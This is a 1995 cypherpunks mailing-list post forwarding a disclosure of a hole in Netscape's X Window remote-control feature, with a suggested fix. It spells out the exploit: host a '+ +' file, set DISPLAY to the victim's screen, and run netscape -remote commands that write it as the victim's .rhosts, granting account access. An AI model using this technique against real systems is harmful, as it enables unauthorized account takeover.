@@ -1,0 +1,75 @@
+From: Jyri Kaljundi <jk@digit.ee>
+Date: Fri, 29 Sep 95 06:59:39 PDT
+To: cypherpunks@toad.com
+Subject: Netscape hole without .Xauthority (fwd)
+Message-ID: <Pine.3.89.9509291503.A1295-0100000@jamarillo>
+MIME-Version: 1.0
+Content-Type: text/plain
+
+
+
+Haven't seen this on the cypherpunks yet, sorry if this has been here 
+already. 
+
+Juri
+
+<o       Jüri Kaljundi          e-mail: jk@digit.ee         o<
+ >o                             tel: +372 6308994            o>
+<o       DigiTurg               http://www.digit.ee/        o<
+
+---------- Forwarded message ----------
+
+There's a huge hole in the Netscape remote control mechanism for the
+X-Windows based clients. 
+Potential impact : anybody can become any user that uses Netscape on any
+system without sufficient X security.
+
+Let's suppose that you have an account on a target machine, where somebody
+is using Netscape, and either the xhost checking is disabled, or you can
+set the xhost yourself (e.g. if you have an account and the target user has
+no .Xauthority, as is frequent in university computer rooms).
+Then you can gain access to the target user's account using the following
+steps :
+
+- make a text file containing only "+ +" accessible (as file, as URL, or
+  whatever you like) to the target Netscape client. This is quite easy, either
+  if you have a personal WWW page (http://... URL) or an account on the
+  target machine (file://... URL), or even by uploading it to an anon FTP
+
+- set your DISPLAY environment variable to the target display
+
+- run the following set of commands :
+
+  netscape -noraise -remote "openURL(<put-your-URL-here>)"
+  netscape -noraise -remote "saveAs(.rhosts)"
+  netscape -noraise -remote back
+
+In the second command, the path should be specified whenever possible 
+(~ is not accepted).
+
+If the target user does not already have a .rhosts and is not looking at that
+precise moment, then the chances are it worked !
+
+Solution to the problem : every user concerned should either create a 
+Xauthority file, or stop using Netscape.
+
+	MXK
+
+
+PS: WHY do they bother with PGP and RSA security when they keep such holes ????
+
++------------------------------------+---------------------------------+
+|  Denis AUROUX  (MXK)               | Ecole Normale Superieure        |
+|  255 rue Saint-Jacques             | 45 rue d'Ulm                    |
+|  75005 PARIS FRANCE                | 75005 PARIS                     |
+|  email: auroux@clipper.ens.fr      | FRANCE                          |
++------------------------------------+---------------------------------+
+| This .sig is SHAREWARE. If you use it often, please send me $50.     |
+| After registering you will receive a fully functional .sig and all   |
+| updates for free.                                                    |
++----------------------------------------------------------------------+
+
+
+
+
+
